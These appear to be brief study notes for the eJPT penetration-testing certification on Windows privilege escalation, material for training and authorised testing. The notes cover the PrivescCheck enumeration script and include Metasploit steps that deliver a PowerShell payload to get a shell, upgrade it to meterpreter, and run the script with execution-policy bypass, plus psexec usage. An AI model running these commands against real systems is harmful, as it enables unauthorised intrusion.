# 53 Windows Privilege Escalation

# Identifying Windows Privilege Escalation Vulnerabilities

## Identifying PrivEsc Vulnerabilities

- In order to elevate your privileges on Windows, you must first, identify privilege escalation vulnerabilities that exist on the target system
- This process will differ greatly based on the type of target you gain access to. Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system's unique configuration.
- This process can be quite tedious and time consuming and as a result, it is recommended to automate the process of identifying privilege escalation vulnerabilities. This can be done through the use of various authentication scripts.

## PrivescCheck

- **PrivescCheck**
	- This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gather various information that might be useful for exploitation and/or post-exploitation.
	- https://github.com/itm4n/PrivescCheck

### DEMO

```shell
# Example with Web_delivery
# Spwn webserver, download payload in target and then execute it
msf6: exploit(multi/script/web_delivery) 
# Run
# Copy the powershell payload and go into target system 
# Paste in CMD the payload
# Shell getted 

# Upgrade shell to meterpreter
msf6: post(multi/manage/shell_to_meterpreter)

# Run PrivescCheck
shell: powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```


# Windows Privilege Escalation

### DEMO

```shell
# Use psexec.py
psexec.py <user>@<ip>
msf6: exploit(windows/smb/psexec)
```

#cybersecurity #eJPT 